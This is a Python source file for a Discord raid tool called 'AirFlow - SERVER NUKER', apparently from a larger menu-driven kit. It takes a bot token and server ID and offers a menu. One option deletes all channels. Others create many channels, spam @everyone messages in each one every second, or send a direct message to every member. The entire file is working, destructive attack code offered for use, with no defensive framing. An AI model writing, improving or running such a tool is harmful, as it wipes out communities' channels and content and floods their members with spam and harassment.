import discord
from discord.ext import commands
import asyncio
import random
from colorama import init, Fore, Style
import os
init()
purple = Fore.MAGENTA
white = Fore.WHITE
reset = Style.RESET_ALL
spamming = False
created_channel_ids = []
message_spam = ""
def styled_input(prompt):
    print(f"{purple}┌───────────────[ {white}AirFlow - SERVER NUKER{purple} ]───────────────┐{reset}")
    print(f"{purple}│{white} {prompt:<50} {reset}")
    print(f"{purple}│{white} >> {reset}", end="")
    user_input = input()
    print(f"{purple}└──────────────────────────────────────────────────┘{reset}")
    return user_input.strip()
def status_message(message):
    print(f"{purple}[EXECUTING]{white} {message}...{reset}")
def completion_message(message):
    print(f"{purple}[COMPLETE]{white} {message}{reset}")
async def server_nuker(token, bot):
    global spamming
    global created_channel_ids
    global message_spam
    server_id = styled_input("Enter the server ID to nuke:")
    if not server_id:
        print(f"{purple}[ERROR]{white} No server ID provided. Exiting...{reset}")
        return
    try:
        server_id = int(server_id)
    except ValueError:
        print(f"{purple}[ERROR]{white} Invalid server ID. Must be a number.{reset}")
        return
    guild = bot.get_guild(server_id)
    if not guild:
        print(f"{purple}[ERROR]{white} Bot is not in the server or invalid server ID.{reset}")
        print(f"{purple}[INFO]{white} Ensure the bot is invited to the server with sufficient permissions (e.g., Administrator).{reset}")
        return
    print(f"{purple}[INFO]{white} Targeting server: {guild.name}{reset}")
    print(f"{purple}[INFO]{white} Available actions:{reset}")
    print(f"  1. Nuke (delete channels, create new ones, spam messages with @everyone)")
    print(f"  2. Spam Channels (create new channels and spam messages)")
    print(f"  3. Delete Channels (delete all channels)")
    print(f"  4. Stop Message Spam (stop spamming messages)")
    print(f"  5. Send PM to All Members (send a message to all members)")
    action = styled_input("Select an action (1-5):")
    if action not in ['1', '2', '3', '4', '5']:
        print(f"{purple}[ERROR]{white} Invalid action selected. Exiting...{reset}")
        return
    if action in ['1', '2']:
        channels_number = styled_input("Enter the number of channels to create:")
        try:
            channels_number = int(channels_number)
            if channels_number <= 0:
                raise ValueError
        except ValueError:
            print(f"{purple}[ERROR]{white} Invalid number of channels. Must be a positive integer.{reset}")
            return
        channels_name = styled_input("Enter the name for the new channels:")
        if not channels_name:
            print(f"{purple}[ERROR]{white} No channel name provided. Exiting...{reset}")
            return
        message_spam = styled_input("Enter the message to spam (leave blank to skip):")
        if not message_spam:
            print(f"{purple}[INFO]{white} No message provided, skipping spam.{reset}")
    if action == '1':
        status_message("Deleting all channels")
        for channel in guild.channels:
            try:
                await channel.delete()
                completion_message(f"Deleted channel: {channel.name}")
            except discord.errors.Forbidden:
                print(f"{purple}[ERROR]{white} Failed to delete channel {channel.name}: Bot lacks permissions.{reset}")
            except Exception as e:
                print(f"{purple}[ERROR]{white} Failed to delete channel {channel.name}: {e}{reset}")
        status_message(f"Creating {channels_number} new channels and spamming messages")
        created_channel_ids.clear()
        spamming = True if message_spam else False
        effective_message = f"@everyone {message_spam}" if message_spam else "@everyone"
        for i in range(channels_number):
            try:
                new_channel = await guild.create_text_channel(channels_name)
                created_channel_ids.append(new_channel.id)
                completion_message(f"Created channel: {channels_name}")
                if spamming:
                    bot.loop.create_task(spam_channel(new_channel, effective_message))
            except discord.errors.Forbidden:
                print(f"{purple}[ERROR]{white} Failed to create channel {channels_name}: Bot lacks permissions.{reset}")
            except Exception as e:
                print(f"{purple}[ERROR]{white} Failed to create channel {channels_name}: {e}{reset}")
    elif action == '2':
        status_message(f"Creating {channels_number} new channels and spamming messages")
        created_channel_ids.clear()
        spamming = True if message_spam else False
        for i in range(channels_number):
            try:
                new_channel = await guild.create_text_channel(channels_name)
                created_channel_ids.append(new_channel.id)
                completion_message(f"Created channel: {channels_name}")
                if spamming:
                    bot.loop.create_task(spam_channel(new_channel, message_spam))
            except discord.errors.Forbidden:
                print(f"{purple}[ERROR]{white} Failed to create channel {channels_name}: Bot lacks permissions.{reset}")
            except Exception as e:
                print(f"{purple}[ERROR]{white} Failed to create channel {channels_name}: {e}{reset}")
    elif action == '3':
        spamming = False
        status_message("Deleting all channels")
        for channel in guild.channels:
            try:
                await channel.delete()
                completion_message(f"Deleted channel: {channel.name}")
            except discord.errors.Forbidden:
                print(f"{purple}[ERROR]{white} Failed to delete channel {channel.name}: Bot lacks permissions.{reset}")
            except Exception as e:
                print(f"{purple}[ERROR]{white} Failed to delete channel {channel.name}: {e}{reset}")
        created_channel_ids.clear()
    elif action == '4':
        status_message("Stopping message spam")
        spamming = False
        completion_message("Message spam stopped")
    elif action == '5':
        pm_message = styled_input("Enter the message to send to all members:")
        if not pm_message:
            print(f"{purple}[ERROR]{white} No message provided. Exiting...{reset}")
            return
        status_message("Sending PM to all members")
        async for member in guild.fetch_members(limit=None):
            if member.id == bot.user.id:
                continue
            try:
                await member.send(pm_message)
                completion_message(f"Sent PM to {member.name}#{member.discriminator}")
            except discord.errors.Forbidden:
                print(f"{purple}[ERROR]{white} Failed to send PM to {member.name}#{member.discriminator}: Bot lacks permissions or user has DMs closed.{reset}")
            except Exception as e:
                print(f"{purple}[ERROR]{white} Failed to send PM to {member.name}#{member.discriminator}: {e}{reset}")
    completion_message("Server Nuker completed its operations")
async def spam_channel(channel, message):
    global spamming
    while spamming:
        try:
            await channel.send(message)
            print(f"{purple}[INFO]{white} Message sent in channel {channel.id}: {message}{reset}")
            await asyncio.sleep(1)
        except discord.errors.Forbidden:
            print(f"{purple}[ERROR]{white} Failed to send message in channel {channel.id}: Bot lacks permissions.{reset}")
        except Exception as e:
            print(f"{purple}[ERROR]{white} Failed to send message in channel {channel.id}: {e}{reset}")
def main():
    token = styled_input("Enter your Discord bot token:")
    if not token:
        print(f"{purple}[ERROR]{white} No bot token provided. Exiting...{reset}")
        return
    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    intents.messages = True
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
    @bot.event
    async def on_ready():
        print(f"{purple}[INFO]{white} Bot logged in as {bot.user.name}#{bot.user.discriminator}{reset}")
        await server_nuker(token, bot)
        await bot.close()
    try:
        bot.run(token)
    except discord.errors.LoginFailure as e:
        print(f"{purple}[ERROR]{white} Failed to login with bot token: {e}. Ensure you provided a valid bot token.{reset}")
        input(f"{purple}[EXIT]{white} Press Enter to return to Ruin menu...{reset}")
    except Exception as e:
        print(f"{purple}[ERROR]{white} An unexpected error occurred: {e}{reset}")
        input(f"{purple}[EXIT]{white} Press Enter to return to Ruin menu...{reset}")

if __name__ == "__main__":
    main()